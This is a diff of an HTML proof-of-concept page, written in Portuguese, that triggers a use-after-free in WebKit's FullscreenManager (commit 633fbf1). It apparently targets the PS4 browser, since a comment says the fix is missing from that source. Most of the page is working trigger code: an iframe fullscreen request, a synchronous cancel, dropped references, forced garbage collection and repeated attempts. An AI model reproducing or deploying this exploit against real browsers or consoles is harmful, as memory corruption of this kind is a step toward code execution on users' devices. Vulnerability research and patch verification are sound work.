@@ -1,753 +1,126 @@
 <!DOCTYPE html>
-<html lang="pt">
-<head>
-<meta charset="UTF-8">
-<meta name="viewport" content="width=device-width, initial-scale=1">
-<title>WebKit FullscreenManager UAF — Test PoC</title>
-<style>
-  :root {
-    --bg:        #0b0e14;
-    --surface:   #131820;
-    --border:    #1f2a38;
-    --text:      #c9d1d9;
-    --muted:     #586473;
-    --accent:    #58a6ff;
-    --green:     #3fb950;
-    --red:       #f85149;
-    --yellow:    #d29922;
-    --purple:    #bc8cff;
-    --cyan:      #39c5cf;
-    --mono:      'JetBrains Mono', 'Fira Code', 'Cascadia Code', monospace;
-    --sans:      'Inter', system-ui, sans-serif;
-  }
-
-  *, *::before, *::after { box-sizing: border-box; margin: 0; padding: 0; }
-
-  body {
-    background: var(--bg);
-    color: var(--text);
-    font-family: var(--sans);
-    font-size: 14px;
-    line-height: 1.6;
-    min-height: 100vh;
-    padding: 24px 20px 48px;
-  }
-
-  /* ── header ── */
-  header {
-    max-width: 900px;
-    margin: 0 auto 32px;
-    border-bottom: 1px solid var(--border);
-    padding-bottom: 20px;
-  }
-  .badge {
-    display: inline-flex;
-    align-items: center;
-    gap: 6px;
-    font-family: var(--mono);
-    font-size: 11px;
-    background: rgba(248,81,73,.15);
-    color: var(--red);
-    border: 1px solid rgba(248,81,73,.35);
-    border-radius: 4px;
-    padding: 3px 10px;
-    margin-bottom: 12px;
-    letter-spacing: .04em;
-  }
-  .badge::before { content: '⚠'; }
-  h1 {
-    font-size: 22px;
-    font-weight: 600;
-    color: #e6edf3;
-    margin-bottom: 6px;
-  }
-  .meta {
-    font-family: var(--mono);
-    font-size: 12px;
-    color: var(--muted);
-  }
-  .meta span { color: var(--accent); }
-
-  /* ── layout ── */
-  .wrapper { max-width: 900px; margin: 0 auto; display: grid; gap: 20px; }
-
-  /* ── card ── */
-  .card {
-    background: var(--surface);
-    border: 1px solid var(--border);
-    border-radius: 8px;
-    overflow: hidden;
-  }
-  .card-head {
-    display: flex;
-    align-items: center;
-    justify-content: space-between;
-    padding: 14px 18px;
-    border-bottom: 1px solid var(--border);
-    gap: 12px;
-  }
-  .card-title {
-    font-size: 13px;
-    font-weight: 600;
-    color: #e6edf3;
-    display: flex;
-    align-items: center;
-    gap: 8px;
-  }
-  .tag {
-    font-family: var(--mono);
-    font-size: 10px;
-    padding: 2px 7px;
-    border-radius: 3px;
-    font-weight: 500;
-    letter-spacing: .04em;
-  }
-  .tag-red    { background: rgba(248,81,73,.15);  color: var(--red);    border: 1px solid rgba(248,81,73,.3);  }
-  .tag-blue   { background: rgba(88,166,255,.12); color: var(--accent); border: 1px solid rgba(88,166,255,.3); }
-  .tag-green  { background: rgba(63,185,80,.12);  color: var(--green);  border: 1px solid rgba(63,185,80,.3);  }
-  .tag-yellow { background: rgba(210,153,34,.15); color: var(--yellow); border: 1px solid rgba(210,153,34,.3); }
-  .tag-purple { background: rgba(188,140,255,.12);color: var(--purple); border: 1px solid rgba(188,140,255,.3);}
-
-  .status-dot {
-    width: 8px; height: 8px; border-radius: 50%;
-    background: var(--muted);
-    flex-shrink: 0;
-    transition: background .3s;
-  }
-  .status-dot.idle    { background: var(--muted); }
-  .status-dot.running { background: var(--yellow); box-shadow: 0 0 6px var(--yellow); animation: pulse .8s infinite; }
-  .status-dot.ok      { background: var(--green);  box-shadow: 0 0 6px var(--green); }
-  .status-dot.fail    { background: var(--red);    box-shadow: 0 0 6px var(--red); }
-
-  @keyframes pulse { 0%,100%{opacity:1} 50%{opacity:.4} }
-
-  .card-body { padding: 18px; }
-
-  /* ── description block ── */
-  .desc {
-    font-size: 12.5px;
-    color: var(--muted);
-    line-height: 1.65;
-    margin-bottom: 16px;
-    padding: 10px 14px;
-    border-left: 2px solid var(--border);
-  }
-  .desc code {
-    font-family: var(--mono);
-    font-size: 11px;
-    color: var(--cyan);
-    background: rgba(57,197,207,.08);
-    padding: 1px 5px;
-    border-radius: 3px;
-  }
-
-  /* ── code block ── */
-  .code-block {
-    font-family: var(--mono);
-    font-size: 11.5px;
-    line-height: 1.7;
-    background: #0d1117;
-    border: 1px solid var(--border);
-    border-radius: 6px;
-    padding: 14px 16px;
-    margin-bottom: 16px;
-    overflow-x: auto;
-    white-space: pre;
-    color: #c9d1d9;
-  }
-  .kw  { color: #ff7b72; }
-  .fn  { color: #d2a8ff; }
-  .str { color: #a5d6ff; }
-  .cmt { color: #546478; font-style: italic; }
-  .hi  { color: var(--yellow); }
-
-  /* ── button ── */
-  .btn {
-    display: inline-flex;
-    align-items: center;
-    gap: 8px;
-    padding: 9px 20px;
-    border-radius: 6px;
-    border: none;
-    font-size: 13px;
-    font-weight: 600;
-    cursor: pointer;
-    transition: opacity .15s, transform .1s;
-    white-space: nowrap;
-  }
-  .btn:active { transform: scale(.97); }
-  .btn:disabled { opacity: .4; cursor: not-allowed; }
-  .btn-red    { background: rgba(248,81,73,.2);  color: var(--red);    border: 1px solid rgba(248,81,73,.4); }
-  .btn-blue   { background: rgba(88,166,255,.15);color: var(--accent); border: 1px solid rgba(88,166,255,.4);}
-  .btn-green  { background: rgba(63,185,80,.15); color: var(--green);  border: 1px solid rgba(63,185,80,.4); }
-  .btn-muted  { background: rgba(88,96,110,.2);  color: var(--muted);  border: 1px solid var(--border); }
-  .btn:not(:disabled):hover { opacity: .85; }
-
-  .btn-row { display: flex; gap: 10px; flex-wrap: wrap; }
-
-  /* ── result strip ── */
-  .result-strip {
-    display: none;
-    margin-top: 14px;
-    padding: 10px 14px;
-    border-radius: 6px;
-    font-family: var(--mono);
-    font-size: 12px;
-    gap: 8px;
-    align-items: flex-start;
-  }
-  .result-strip.show { display: flex; }
-  .result-strip.ok   { background: rgba(63,185,80,.1);  border: 1px solid rgba(63,185,80,.3);  color: var(--green); }
-  .result-strip.fail { background: rgba(248,81,73,.1);  border: 1px solid rgba(248,81,73,.3);  color: var(--red); }
-  .result-strip.info { background: rgba(88,166,255,.08);border: 1px solid rgba(88,166,255,.25);color: var(--accent); }
-  .result-strip .icon { flex-shrink: 0; font-size: 14px; margin-top: 1px; }
-
-  /* ── console ── */
-  #console {
-    font-family: var(--mono);
-    font-size: 12px;
-    line-height: 1.8;
-    background: #0d1117;
-    border: 1px solid var(--border);
-    border-radius: 6px;
-    padding: 14px 16px;
-    min-height: 180px;
-    max-height: 320px;
-    overflow-y: auto;
-  }
-  .log-line { display: flex; gap: 10px; }
-  .log-ts   { color: var(--muted); flex-shrink: 0; }
-  .log-msg  { flex: 1; }
-  .log-line.info  .log-msg { color: var(--text); }
-  .log-line.ok    .log-msg { color: var(--green); }
-  .log-line.error .log-msg { color: var(--red); }
-  .log-line.warn  .log-msg { color: var(--yellow); }
-  .log-line.debug .log-msg { color: var(--muted); }
-  .log-line.head  .log-msg { color: var(--purple); font-weight: 600; }
-
-  /* ── gc display ── */
-  .gc-info {
-    display: flex;
-    align-items: center;
-    justify-content: space-between;
-    padding: 10px 14px;
-    background: rgba(188,140,255,.06);
-    border: 1px solid rgba(188,140,255,.2);
-    border-radius: 6px;
-    margin-bottom: 16px;
-  }
-  .gc-label { font-size: 12px; color: var(--purple); font-family: var(--mono); }
-  .gc-counter { font-size: 11px; color: var(--muted); font-family: var(--mono); }
-
-  /* ── promise check ── */
-  .promise-result {
-    display: flex;
-    gap: 10px;
-    margin-top: 14px;
-  }
-  .promise-cell {
-    flex: 1;
-    padding: 12px 14px;
-    border-radius: 6px;
-    border: 1px solid var(--border);
-    background: rgba(255,255,255,.02);
-  }
-  .promise-cell .api  { font-family: var(--mono); font-size: 11px; color: var(--cyan); margin-bottom: 6px; }
-  .promise-cell .val  { font-family: var(--mono); font-size: 13px; font-weight: 700; }
-  .promise-cell .hint { font-size: 11px; color: var(--muted); margin-top: 4px; }
-  .val-promise { color: var(--green); }
-  .val-void    { color: var(--red); }
-  .val-pending { color: var(--muted); }
-</style>
-</head>
+<html>
+<head><title>FullscreenManager UAF PoC — 633fbf1</title></head>
 <body>
 
-<header>
-  <div class="badge">CVE / Use-After-Free — FullscreenManager</div>
-  <h1>WebKit FullscreenManager UAF — Test PoC</h1>
-  <p class="meta">
-    commit <span>633fbf1</span> &nbsp;·&nbsp;
-    bug <span>263140</span> &nbsp;·&nbsp;
-    arquivo: <span>FullscreenManager.cpp</span> &nbsp;·&nbsp;
-    alvo: <span>requestFullscreenForElement / failedPreflights</span>
-  </p>
-</header>
-
-<div class="wrapper">
-
-  <!-- ── TEST 1: requestFullscreen() com Promise ── -->
-  <div class="card">
-    <div class="card-head">
-      <div class="card-title">
-        <span class="status-dot idle" id="dot1"></span>
-        Teste 1 — <code style="font-family:var(--mono);font-size:12px;">requestFullscreen()</code>
-        &nbsp;
-        <span class="tag tag-red">VULNERÁVEL</span>
-        <span class="tag tag-blue">Promise-based</span>
-      </div>
-      <span class="tag tag-yellow">Padrão W3C</span>
-    </div>
-    <div class="card-body">
-
-      <div class="desc">
-        Replica o PoC do commit <code>633fbf1</code>: cria um <code>&lt;iframe&gt;</code>, chama
-        <code>div.requestFullscreen()</code> (que passa uma <code>DeferredPromise</code>),
-        remove o iframe, chama <code>webkitCancelFullScreen()</code> e força o GC.<br>
-        O <code>failedPreflights</code> chama <code>promise→reject()</code> e depois
-        <code>m_document.eventLoop()</code> em memória já libertada → <strong>Use-After-Free</strong>.
-      </div>
-
-      <div class="code-block"><span class="cmt">// Sequência do crash</span>
-<span class="kw">const</span> iframe = document.body.<span class="fn">appendChild</span>(<span class="str">'iframe'</span>);
-<span class="kw">const</span> div   = iframe.contentDocument.body.<span class="fn">appendChild</span>(<span class="str">'div'</span>);
-
-<span class="hi">div.<span class="fn">requestFullscreen</span>()          <span class="cmt">// ← promise != null (path vulnerável)</span></span>
-  .<span class="fn">catch</span>(<span class="kw">e</span> => { <span class="cmt">/* rejection handler → pode libertar Document */</span> });
-
-document.body.<span class="fn">removeChild</span>(iframe); <span class="cmt">// remove iframe → Document perde refs</span>
-<span class="fn">setTimeout</span>(() => {
-  contentDocument.<span class="fn">webkitCancelFullScreen</span>(); <span class="cmt">// zera pendingFullscreenElement</span>
-  <span class="fn">gc</span>();                                     <span class="cmt">// força coleta → Document destruído</span>
-  <span class="cmt">// failedPreflights corre:                               </span>
-  <span class="cmt">//   promise->reject() → m_document freed                </span>
-  <span class="cmt">//   m_document.eventLoop()  ← UAF / CRASH               </span>
-}, <span class="hi">0</span>);</div>
-
-      <div class="btn-row">
-        <button class="btn btn-red" id="btn1" onclick="runTest1(this)">
-          ▶ Executar Teste 1
-          <span style="font-size:11px;opacity:.7">(gesto obrigatório)</span>
-        </button>
-        <button class="btn btn-muted" onclick="resetTest(1)">↺ Resetar</button>
-      </div>
-
-      <div class="result-strip" id="res1">
-        <span class="icon"></span>
-        <span id="res1-msg"></span>
-      </div>
-
-    </div>
-  </div>
-
-  <!-- ── TEST 2: webkitRequestFullscreen() sem Promise ── -->
-  <div class="card">
-    <div class="card-head">
-      <div class="card-title">
-        <span class="status-dot idle" id="dot2"></span>
-        Teste 2 — <code style="font-family:var(--mono);font-size:12px;">webkitRequestFullscreen()</code>
-        &nbsp;
-        <span class="tag tag-green">NÃO AFETADO</span>
-        <span class="tag tag-blue">Event-based</span>
-      </div>
-      <span class="tag tag-purple">Prefixado WebKit</span>
-    </div>
-    <div class="card-body">
-
-      <div class="desc">
-        <code>webkitRequestFullscreen()</code> chama <code>requestFullscreenForElement</code>
-        com <code>promise = nullptr</code>, então <code>isFromPrefixedAPI = true</code>.
-        O guard <code>if (promise)</code> nunca executa <code>reject()</code>, eliminando
-        o vetor do UAF. Verifica também se a função retorna uma <code>Promise</code>.
-      </div>
-
-      <div class="code-block"><span class="cmt">// PS4 usa este caminho para entrar em fullscreen</span>
-<span class="kw">const</span> el = document.<span class="fn">createElement</span>(<span class="str">'div'</span>);
-<span class="kw">const</span> ret = el.<span class="fn">webkitRequestFullscreen</span>();
-
-<span class="cmt">// No C++ → requestFullscreenForElement(..., promise = nullptr, ...)</span>
-<span class="cmt">// bool isFromPrefixedAPI = !promise;  →  true</span>
-<span class="cmt">// if (promise) promise->reject(...)   →  NUNCA CORRE</span>
-
-<span class="hi">console.<span class="fn">log</span>(ret <span class="kw">instanceof</span> Promise); <span class="cmt">// esperado: false (void)</span></span>
-
-<span class="cmt">// Eventos em vez de promise:</span>
-el.<span class="fn">addEventListener</span>(<span class="str">'webkitfullscreenchange'</span>, () => { <span class="cmt">/* ok */</span> });
-el.<span class="fn">addEventListener</span>(<span class="str">'webkitfullscreenerror'</span>,  () => { <span class="cmt">/* err */</span> });</div>
-
-      <div class="btn-row">
-        <button class="btn btn-green" id="btn2" onclick="runTest2(this)">
-          ▶ Executar Teste 2
-          <span style="font-size:11px;opacity:.7">(gesto obrigatório)</span>
-        </button>
-        <button class="btn btn-muted" onclick="resetTest(2)">↺ Resetar</button>
-      </div>
-
-      <div class="promise-result" id="promise-result" style="display:none">
-        <div class="promise-cell">
-          <div class="api">requestFullscreen()</div>
-          <div class="val val-promise" id="pv1">Promise ✓</div>
-          <div class="hint">Retorna Promise — vetor do UAF ativo</div>
-        </div>
-        <div class="promise-cell">
-          <div class="api">webkitRequestFullscreen()</div>
-          <div class="val" id="pv2">—</div>
-          <div class="hint" id="ph2">aguardando teste…</div>
-        </div>
-      </div>
-
-      <div class="result-strip" id="res2">
-        <span class="icon"></span>
-        <span id="res2-msg"></span>
-      </div>
-
-    </div>
-  </div>
-
-  <!-- ── GC ── -->
-  <div class="card">
-    <div class="card-head">
-      <div class="card-title">
-        <span class="tag tag-purple">GC</span>
-        Função de Coleta Forçada
-      </div>
-    </div>
-    <div class="card-body">
-
-      <div class="gc-info">
-        <span class="gc-label">gc() chamadas: <span id="gc-count">0</span></span>
-        <span class="gc-counter">objetos alocados por chamada: ~100.000</span>
-      </div>
-
-      <div class="code-block"><span class="kw">function</span> <span class="fn">gc</span>() {
-  <span class="kw">function</span> <span class="fn">gcRec</span>(n) {
-    <span class="kw">if</span> (n &lt; <span class="hi">1</span>) <span class="kw">return</span> {};
-    <span class="kw">var</span> temp = { i: <span class="str">"ab"</span> + i + (i / <span class="hi">100000</span>) };
-    temp += <span class="str">"foo"</span>;
-    <span class="fn">gcRec</span>(n - <span class="hi">1</span>);
-  }
-  <span class="kw">for</span> (<span class="kw">var</span> i = <span class="hi">0</span>; i &lt; <span class="hi">10000</span>; i++)
-    <span class="fn">gcRec</span>(<span class="hi">10</span>);
-}</div>
-
-      <div class="btn-row">
-        <button class="btn btn-muted" onclick="runGC()">⚙ Testar gc() isolado</button>
-      </div>
-
-    </div>
-  </div>
-
-  <!-- ── console ── -->
-  <div class="card">
-    <div class="card-head">
-      <div class="card-title">
-        <span class="tag tag-blue">LOG</span>
-        Console de Saída
-      </div>
-      <button class="btn btn-muted" style="padding:5px 12px;font-size:11px" onclick="clearLog()">limpar</button>
-    </div>
-    <div class="card-body" style="padding:0">
-      <div id="console"></div>
-    </div>
-  </div>
-
-</div><!-- /wrapper -->
+<button id="btn" onclick="run(this)">&#9654; Run PoC (clique = gesto obrigatorio)</button>
+<pre id="log"></pre>
 
 <script>
-/* ═══════════════════════════════════════════
-   GC — função fornecida
-   ═══════════════════════════════════════════ */
-var gcCalls = 0;
+/*
+ * PoC: Use-After-Free em FullscreenManager::requestFullscreenForElement
+ * Commit fix: 633fbf1 | Bug: webkit.org/263140
+ *
+ * Caminho vulneravel:
+ *   failedPreflights:
+ *     promise->reject()          <- pode libertar Document (DeferredPromise = ultima ref)
+ *     m_document.eventLoop()     <- UAF se Document foi destruido acima
+ *
+ * Fix ausente no fonte PS4:
+ *   Ref document { protectedDocument() };  <- NAO encontrado em FullscreenManager.cpp
+ */
+
+/* ── GC via pressao de alocacao (fornecida) ── */
 function gc() {
     function gcRec(n) {
-        if (n < 1)
-            return {};
+        if (n < 1) return {};
         var temp = { i: "ab" + i + (i / 100000) };
         temp += "foo";
         gcRec(n - 1);
     }
     for (var i = 0; i < 10000; i++)
         gcRec(10);
-    gcCalls++;
-    document.getElementById('gc-count').textContent = gcCalls;
 }
 
-/* ═══════════════════════════════════════════
-   Logger
-   ═══════════════════════════════════════════ */
-var con = document.getElementById('console');
-
-function log(msg, type) {
-    type = type || 'info';
-    var now = new Date();
-    var ts  = now.toTimeString().slice(0,8) + '.' +
-              String(now.getMilliseconds()).padStart(3,'0');
-    var line = document.createElement('div');
-    line.className = 'log-line ' + type;
-    line.innerHTML = '<span class="log-ts">[' + ts + ']</span>' +
-                     '<span class="log-msg">' + esc(msg) + '</span>';
-    con.appendChild(line);
-    con.scrollTop = con.scrollHeight;
-}
-
-function esc(s) {
-    return String(s)
-        .replace(/&/g,'&amp;')
-        .replace(/</g,'&lt;')
-        .replace(/>/g,'&gt;');
-}
-
-function clearLog() { con.innerHTML = ''; }
-
-function setDot(n, state) {
-    document.getElementById('dot' + n).className = 'status-dot ' + state;
-}
-
-function showResult(n, type, icon, msg) {
-    var el  = document.getElementById('res' + n);
-    var msg_el = document.getElementById('res' + n + '-msg');
-    el.className = 'result-strip show ' + type;
-    el.querySelector('.icon').textContent = icon;
-    msg_el.textContent = msg;
-}
-
-function disableBtn(id) {
-    document.getElementById(id).disabled = true;
-}
-
-function resetTest(n) {
-    setDot(n, 'idle');
-    document.getElementById('res' + n).className = 'result-strip';
-    document.getElementById('btn' + n).disabled = false;
-    if (n === 2) {
-        document.getElementById('promise-result').style.display = 'none';
+/* ── GC complementar via ArrayBuffer grande ── */
+function gcHeavy() {
+    var bufs = [];
+    for (var i = 0; i < 30; i++) {
+        try { bufs.push(new ArrayBuffer(10 * 1024 * 1024)); } catch(e) { break; }
     }
-    log('── Teste ' + n + ' resetado ──', 'debug');
+    bufs = null;
+    gc();
+    gc();
 }
 
-/* ═══════════════════════════════════════════
-   TESTE 1 — requestFullscreen() com Promise
-   Replica PoC do commit 633fbf1
-   ═══════════════════════════════════════════ */
-function runTest1(btn) {
-    disableBtn('btn1');
-    setDot(1, 'running');
-    log('═══ TESTE 1: requestFullscreen() — UAF PoC ═══', 'head');
-    log('Verificando suporte à API padrão...', 'info');
+var L = document.getElementById('log');
+function log(s) { L.textContent += '[' + new Date().toTimeString().slice(0,8) + '] ' + s + '\n'; }
 
-    // Verifica suporte
-    if (typeof document.createElement('div').requestFullscreen !== 'function') {
-        log('requestFullscreen() NÃO disponível neste browser.', 'warn');
-        log('→ Browser pode expor apenas a API prefixada (webkitRequestFullscreen).', 'warn');
-        log('→ O vetor do UAF não é trigável via esta rota neste ambiente.', 'warn');
-        setDot(1, 'fail');
-        showResult(1, 'info', 'ℹ',
-            'requestFullscreen() ausente — vetor UAF inativo (apenas API prefixada disponível).');
-        return;
-    }
+/*
+ * Sequencia corrigida vs teste anterior:
+ *
+ *  1. requestFullscreen()           -> DeferredPromise criada (promise != null)
+ *  2. webkitCancelFullScreen()      -> m_pendingFullscreenElement = nullptr  [SINCRONO]
+ *  3. Zerar TODAS as refs JS        -> Document sem raizes JS
+ *  4. gcHeavy()                     -> forcar coleta ANTES da task async rodar
+ *  5. Task async dispara:
+ *       m_pendingFullscreenElement(null) != element -> failedPreflights(element, promise)
+ *         promise->reject()         -> se Document foi coletado no passo 4: UAF aqui
+ *         m_document.eventLoop()    <- CRASH se m_document foi destruido
+ */
+function attempt(n) {
+    var iframe = document.body.appendChild(document.createElement('iframe'));
+    var iframeDoc  = iframe.contentDocument;
+    var div = iframeDoc.body.appendChild(document.createElement('div'));
 
-    log('requestFullscreen() detectado ✓', 'ok');
-    log('Criando iframe de teste...', 'info');
+    /* PASSO 1: requestFullscreen — isFromPrefixedAPI = false, promise != null */
+    var p = div.requestFullscreen();
+    log('[' + n + '] requestFullscreen -> ' + (p instanceof Promise ? 'Promise (vulneravel)' : typeof p));
 
-    var crashed = false;
-    var timer;
-
-    // Timeout de segurança: se em 4s não crashou, consideramos "patched"
-    timer = setTimeout(function() {
-        if (!crashed) {
-            log('Timeout sem crash → versão provavelmente CORRIGIDA.', 'ok');
-            setDot(1, 'ok');
-            showResult(1, 'ok', '✓',
-                'Sem crash detectado. Fix do commit 633fbf1 parece PRESENTE nesta build.');
-        }
-    }, 4000);
-
-    try {
-        // Passo 1: criar iframe e div dentro do seu documento
-        var iframe = document.body.appendChild(document.createElement('iframe'));
-        log('iframe criado e adicionado ao DOM.', 'debug');
-
-        var contentDocument = iframe.contentDocument;
-        var div = contentDocument.body.appendChild(document.createElement('div'));
-        log('div criado no contentDocument do iframe.', 'debug');
-
-        // Passo 2: requestFullscreen() — passa DeferredPromise (path vulnerável)
-        log('Chamando div.requestFullscreen() [com Promise, isFromPrefixedAPI = false]...', 'info');
-        var p = div.requestFullscreen();
-
-        if (p instanceof Promise) {
-            log('Retorno: Promise ✓ (confirmado — DeferredPromise será criada no C++)', 'ok');
-        } else {
-            log('Retorno inesperado: ' + typeof p, 'warn');
-        }
-
-        p.catch(function(err) {
-            log('Promise rejeitada: ' + (err && err.message ? err.message : err), 'warn');
-            log('→ rejection handler executado (ponto onde Document pode ser libertado)', 'warn');
+    if (p instanceof Promise) {
+        p.catch(function(e) {
+            /* este callback roda DEPOIS do UAF (microtask apos failedPreflights) */
+            /* se chegar aqui sem crash = fix presente ou GC nao coletou o Document */
+            log('[' + n + '] catch pos-UAF: ' + e + '  <- se nao crashou, Document sobreviveu');
         });
-
-        // Passo 3: remover iframe → Document começa a perder referências
-        log('Removendo iframe do DOM (document perde referências externas)...', 'info');
-        document.body.removeChild(iframe);
-
-        // Passo 4 (assíncrono): cancelar + GC para libertar o Document
-        setTimeout(function() {
-            log('setTimeout callback: chamando webkitCancelFullScreen()...', 'info');
-            try {
-                contentDocument.webkitCancelFullScreen();
-                log('webkitCancelFullScreen() chamado → m_pendingFullscreenElement = nullptr', 'debug');
-            } catch(e) {
-                log('webkitCancelFullScreen() erro: ' + e, 'warn');
-            }
-
-            log('Forçando GC para libertar o Document do iframe...', 'info');
-            gc();
-            log('GC concluído. Aguardando task assíncrona do failedPreflights...', 'debug');
-            log('Se crash → UAF confirmado em m_document.eventLoop() pós-reject()', 'warn');
-
-            // Segunda rodada de GC para aumentar pressão
-            setTimeout(function() {
-                gc();
-                log('GC secundário concluído. Se chegou aqui → sem crash imediato.', 'debug');
-            }, 50);
-
-        }, 0);
-
-    } catch(e) {
-        clearTimeout(timer);
-        crashed = true;
-        log('EXCEÇÃO CAPTURADA: ' + e, 'error');
-        log('→ Possível indicador de comportamento anômalo.', 'error');
-        setDot(1, 'fail');
-        showResult(1, 'fail', '✗',
-            'Exceção: ' + e + ' — verificar logs para análise.');
     }
+
+    /* PASSO 2: cancelar SINCRONAMENTE — seta m_pendingFullscreenElement = nullptr
+     * Garante path: "mismatch" na task, nao "isConnected" (mais previsivel) */
+    iframeDoc.webkitCancelFullScreen();
+    log('[' + n + '] webkitCancelFullScreen() -> m_pendingFullscreenElement = null');
+
+    /* PASSO 3: zerar TODAS as referencias JS ao Document do iframe */
+    div      = null;
+    iframeDoc = null;
+    document.body.removeChild(iframe);
+    iframe   = null;
+    /* p (Promise JS) tambem zerada — DeferredPromise C++ pode ser a unica ref ao Document */
+    p        = null;
+
+    /* PASSO 4: GC MAXIMO antes da task async — Document deve ter zero raizes JS agora */
+    gcHeavy();
+    log('[' + n + '] gcHeavy() concluido — task async pendente na fila do eventLoop');
+
+    /* PASSO 5: task async do requestFullscreenForElement vai rodar no proximo tick:
+     *   if (m_pendingFullscreenElement != element.ptr())  <- TRUE (cancelamos no passo 2)
+     *       failedPreflights(element, promise)
+     *         promise->reject()                           <- UAF se Document coletado acima
+     *         m_document.eventLoop().queueTask(...)       <- CRASH esperado aqui
+     */
 }
 
-/* ═══════════════════════════════════════════
-   TESTE 2 — webkitRequestFullscreen() sem Promise
-   ═══════════════════════════════════════════ */
-function runTest2(btn) {
-    disableBtn('btn2');
-    setDot(2, 'running');
-    log('═══ TESTE 2: webkitRequestFullscreen() — Verificação de Promise ═══', 'head');
+function run(btn) {
+    btn.disabled = true;
+    log('=== PoC: FullscreenManager UAF | 633fbf1 ===');
+    log('C++: Ref document{protectedDocument()} ausente em FullscreenManager.cpp');
+    log('Path: requestFullscreen(Promise) + webkitCancelFullScreen[sync] + gcHeavy');
+    log('');
 
-    var el = document.createElement('div');
-    document.body.appendChild(el);
+    var TENTATIVAS = 5;
 
-    // Verificar requestFullscreen primeiro (referência)
-    var hasStandard = typeof el.requestFullscreen === 'function';
-    var hasPrefixed = typeof el.webkitRequestFullscreen === 'function';
-
-    log('API padrão   requestFullscreen():       ' + (hasStandard ? 'DISPONÍVEL' : 'AUSENTE'), 
-        hasStandard ? 'ok' : 'warn');
-    log('API prefixada webkitRequestFullscreen(): ' + (hasPrefixed ? 'DISPONÍVEL' : 'AUSENTE'), 
-        hasPrefixed ? 'ok' : 'warn');
-
-    document.getElementById('promise-result').style.display = 'flex';
-
-    // Testar retorno do requestFullscreen (referência)
-    if (hasStandard) {
-        var testEl = document.createElement('div');
-        document.body.appendChild(testEl);
-        try {
-            var stdRet = testEl.requestFullscreen();
-            var isPromise = stdRet instanceof Promise;
-            log('requestFullscreen() retorna Promise: ' + isPromise, isPromise ? 'ok' : 'warn');
-            document.getElementById('pv1').className = 'val ' + (isPromise ? 'val-promise' : 'val-void');
-            document.getElementById('pv1').textContent = isPromise ? 'Promise ✓' : 'void ✗';
-            if (stdRet && stdRet.catch) stdRet.catch(function(){});
-        } catch(e) {
-            log('requestFullscreen() lançou exceção: ' + e, 'warn');
-        }
-        document.exitFullscreen && document.exitFullscreen().catch(function(){});
-        document.body.removeChild(testEl);
-    } else {
-        document.getElementById('pv1').className = 'val val-void';
-        document.getElementById('pv1').textContent = 'N/A';
-    }
-
-    // Testar webkitRequestFullscreen
-    if (!hasPrefixed) {
-        log('webkitRequestFullscreen() NÃO disponível.', 'error');
-        setDot(2, 'fail');
-        showResult(2, 'fail', '✗', 'webkitRequestFullscreen() ausente neste browser.');
-        document.getElementById('pv2').className = 'val val-void';
-        document.getElementById('pv2').textContent = 'N/A';
-        document.getElementById('ph2').textContent = 'API não encontrada';
-        document.body.removeChild(el);
-        return;
-    }
-
-    // Registrar listeners ANTES da chamada
-    el.addEventListener('webkitfullscreenchange', function() {
-        log('webkitfullscreenchange disparado ✓ (sucesso via evento)', 'ok');
-        document.webkitExitFullscreen && document.webkitExitFullscreen();
-    });
-
-    el.addEventListener('webkitfullscreenerror', function(e) {
-        log('webkitfullscreenerror disparado (falha via evento) — normal em contextos restritos', 'warn');
-    });
-
-    log('Chamando el.webkitRequestFullscreen() [promise = nullptr, isFromPrefixedAPI = true]...', 'info');
-
-    var ret;
-    try {
-        ret = el.webkitRequestFullscreen();
-    } catch(e) {
-        log('webkitRequestFullscreen() lançou: ' + e, 'warn');
-        ret = undefined;
-    }
-
-    // Analisar retorno
-    var retType = ret === undefined ? 'undefined' : (ret === null ? 'null' : typeof ret);
-    var retIsPromise = ret instanceof Promise;
-    var retIsVoid   = ret === undefined || ret === null;
-
-    log('webkitRequestFullscreen() retorna: ' + retType + (retIsPromise ? ' (Promise!)' : ''), 
-        retIsVoid ? 'ok' : (retIsPromise ? 'warn' : 'info'));
-
-    var pv2 = document.getElementById('pv2');
-    var ph2 = document.getElementById('ph2');
-
-    if (retIsPromise) {
-        pv2.className = 'val val-promise';
-        pv2.textContent = 'Promise ⚠';
-        ph2.textContent = 'INESPERADO — esta build pode ter mudado a API';
-        log('⚠ ATENÇÃO: webkitRequestFullscreen() retornou Promise — comportamento não-padrão!', 'warn');
-        log('→ Se isFromPrefixedAPI = false nesta build, o vetor UAF pode estar ativo aqui.', 'warn');
-        setDot(2, 'fail');
-        showResult(2, 'info', '⚠',
-            'webkitRequestFullscreen() retornou Promise — verificar binding JS desta build!');
-    } else if (retIsVoid) {
-        pv2.className = 'val val-void';
-        pv2.textContent = 'void ✓';
-        ph2.textContent = 'Sem Promise → isFromPrefixedAPI = true → UAF inativo neste caminho';
-        log('webkitRequestFullscreen() retornou void/undefined ✓', 'ok');
-        log('→ Confirmado: promise = nullptr no C++', 'ok');
-        log('→ isFromPrefixedAPI = !promise = true', 'ok');
-        log('→ guard "if (promise) promise->reject()" NUNCA corre', 'ok');
-        log('→ Este caminho NÃO é vulnerável ao UAF do commit 633fbf1', 'ok');
-        setDot(2, 'ok');
-        showResult(2, 'ok', '✓',
-            'webkitRequestFullscreen() retorna void — sem Promise, sem UAF neste caminho.');
-    } else {
-        pv2.className = 'val';
-        pv2.textContent = retType;
-        ph2.textContent = 'Valor inesperado: ' + ret;
-        log('Valor inesperado retornado: ' + ret, 'warn');
-        setDot(2, 'fail');
-        showResult(2, 'info', '?', 'Retorno inesperado: ' + retType);
+    for (var i = 0; i < TENTATIVAS; i++) {
+        attempt(i);
     }
 
     setTimeout(function() {
-        document.body.contains(el) && document.body.removeChild(el);
-    }, 2000);
+        log('');
+        log('=== ' + TENTATIVAS + ' tentativas processadas ===');
+        log('Se nenhum crash: fix presente no binario OU GC nao coletou o Document');
+        log('Se crash/freeze antes daqui: UAF confirmado');
+    }, 3000);
 }
-
-/* ═══════════════════════════════════════════
-   GC isolado
-   ═══════════════════════════════════════════ */
-function runGC() {
-    log('Executando gc() isolado...', 'info');
-    var t0 = performance.now();
-    gc();
-    var t1 = performance.now();
-    log('gc() concluído em ' + (t1 - t0).toFixed(1) + 'ms', 'ok');
-}
-
-/* log inicial */
-log('PoC carregado. Pressione um botão para iniciar (gesto do usuário obrigatório).', 'info');
-log('Ambos os testes requerem interação direta do usuário para requestFullscreen.', 'debug');
 </script>
+
 </body>
 </html>
